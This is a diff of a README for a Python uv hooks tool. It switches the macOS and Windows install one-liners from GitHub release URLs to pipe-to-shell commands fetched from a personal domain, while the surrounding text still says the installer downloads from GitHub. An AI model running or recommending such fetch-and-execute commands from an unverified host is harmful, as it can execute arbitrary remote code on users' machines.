@@ -44,13 +44,13 @@ Install the latest stable GitHub release into a user-level binary directory.
 macOS:
 
 ```sh
-curl -LsSf https://github.com/jinxiao/python-uv-hooks-4-ai/releases/latest/download/install.sh | sh
+curl -LsSf https://uv-python-hook.jinxiao2010.uk/install.sh | sh
 ```
 
 Windows PowerShell:
 
 ```powershell
-powershell -ExecutionPolicy ByPass -c "irm https://github.com/jinxiao/python-uv-hooks-4-ai/releases/latest/download/install.ps1 | iex"
+powershell -ExecutionPolicy ByPass -c "irm https://uv-python-hook.jinxiao2010.uk/install.ps1 | iex"
 ```
 
 The installer fetches the latest stable release from GitHub, downloads the
